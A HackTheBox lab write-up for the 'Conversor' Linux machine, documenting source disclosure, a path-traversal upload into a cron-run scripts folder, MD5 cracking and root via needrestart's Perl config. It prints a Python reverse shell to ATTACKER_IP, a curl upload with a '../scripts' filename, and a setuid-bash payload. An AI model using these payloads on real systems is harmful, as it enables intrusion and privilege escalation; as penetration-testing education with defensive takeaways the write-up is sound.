---
title: "Conversor — HackTheBox Writeup"
date: "2026-02-27"
description: "Easy Linux machine involving Flask source code disclosure, path traversal file upload to cron-executed directory, and needrestart Perl config injection for root"
tags: ['hackthebox', 'writeup', 'linux', 'web pentest', 'path traversal', 'file upload', 'python']
thumbnail: ""
---

# Conversor — HTB Labs Machine Writeup

**Difficulty:** Easy
**OS:** Linux (Ubuntu 22.04)

---

## Attack Chain Summary

```
Source code disclosure (/static/source_code.tar.gz)
    → Whitebox analysis → Path traversal + cron vector identified
        → Register account → Upload reverse shell via path traversal
            → Cron fires (≤60s) → Shell as www-data
                → SQLite DB dump → Crack MD5 hash → su to fismathack
                    → sudo needrestart -c /tmp/evil.conf → Perl eval → Root
```

---

## Phase 1: Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -Pn --top-ports 1000 10.129.238.31
```

**Open Ports:**
| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | Apache 2.4.52, Flask app |

### Web Enumeration

| Path | Status | Notes |
|------|--------|-------|
| `/login` | 200 | Login form |
| `/register` | 200 | Open self-registration |
| `/about` | 200 | Developer page + **source code download** |

**Critical finding**: A link to `/static/source_code.tar.gz` — full application source code available without authentication.

---

## Phase 2: Source Code Analysis (Whitebox)

```bash
wget http://conversor.htb/static/source_code.tar.gz
tar -xzf source_code.tar.gz
```

### Key Findings

**1. Path Traversal in File Upload (CRITICAL)**

```python
# app.py lines 99-102
xml_path  = os.path.join(UPLOAD_FOLDER, xml_file.filename)
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
xml_file.save(xml_path)    # Written to disk BEFORE any validation
xslt_file.save(xslt_path)  # Written to disk BEFORE any validation
```

No call to `secure_filename()`. A filename like `../scripts/evil.py` resolves outside `uploads/`. Files are written before parsing, so even if parsing fails, the file is planted.

**2. Cron Job Executes Any Python in scripts/**

From `install.md`:
```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Combined vector**: Path traversal + cron = arbitrary code execution as `www-data` within 60 seconds.

**3. MD5 Unsalted Password Hashing**

```python
password = hashlib.md5(request.form['password'].encode()).hexdigest()
```

**4. SQLite DB Bundled in Archive** — `instance/users.db` included with existing user hashes.

---

## Phase 3: Initial Access

### Upload via Path Traversal

```bash
# Create reverse shell
cat > /tmp/revshell.py << 'EOF'
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 9001))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF

# Upload with path traversal filename
curl -s -X POST http://conversor.htb/convert \
  -b @/tmp/conversor.jar \
  -F "xml_file=@/tmp/legit.xml;filename=legit.xml" \
  -F "xslt_file=@/tmp/revshell.py;filename=../scripts/revshell.py"
```

The server returns an error (`.py` is not valid XSLT), but the file was already written to `/var/www/conversor.htb/scripts/revshell.py`.

Within 60 seconds, cron executes the script:

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Phase 4: Lateral Movement — www-data to fismathack

### SQLite Database Dump

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

User `fismathack` has an MD5 hash. Cracked with hashcat:

```bash
hashcat -m 0 fismathack.hash /usr/share/wordlists/rockyou.txt
```

Credentials recovered: `fismathack:<redacted>`

SSH login confirmed credential reuse.

---

## Phase 5: Privilege Escalation — needrestart Perl Injection

### sudo Enumeration

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

### needrestart -c Flag Abuse

needrestart is implemented in Perl and uses `do FILE` / `eval` to process its config file. The `-c` flag loads a custom config — any Perl code in it gets executed as root.

```bash
cat > /tmp/evil.conf << 'PERL'
$nrconf{override_rc}{qw()} = 0;
system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash");
PERL

sudo /usr/sbin/needrestart -c /tmp/evil.conf
/tmp/rootbash -p
```

```
rootbash-5.1# id
uid=1000(fismathack) gid=1000(fismathack) euid=0(root)
```

---

## Failed Attempts & Dead Ends

| # | What Was Tried | Why It Failed | Lesson |
|---|----------------|---------------|--------|
| 1 | XSLT injection with lxml extension functions | lxml version didn't support `os` extension namespace | XSLT RCE via extensions is version-dependent |
| 2 | CVE-2024-48990 (PYTHONPATH injection into needrestart) | `env_reset` in sudoers stripped PYTHONPATH | Check sudoers defaults before env manipulation attacks |
| 3 | Forging Flask session with hardcoded secret `Changemeplease` | Live instance used a different secret key | Hardcoded secrets in source may differ from deployment |

---

## Key Takeaways

1. **Source code disclosure is game over** — Exposing full application source without authentication provides complete whitebox knowledge.

2. **Files saved before validation is a critical design flaw** — Always validate and sanitize input before writing to disk.

3. **`secure_filename()` exists for a reason** — Not calling it with user-supplied filenames is textbook CWE-22.

4. **Cron executing files in a web-writable directory is inherently dangerous** — Script directories must never overlap with upload paths.

5. **MD5 without salt is not password hashing** — Use bcrypt, argon2, or PBKDF2.

6. **needrestart -c evals Perl as root** — Sudo rules must restrict arguments for needrestart.

---

## Tools Used

- `nmap` — Port scanning and service detection
- `ffuf` — Directory fuzzing
- `curl` — HTTP requests and multipart upload
- `sqlite3` — Database dump
- `hashcat -m 0` — MD5 hash cracking
- `linpeas` — Privilege escalation enumeration
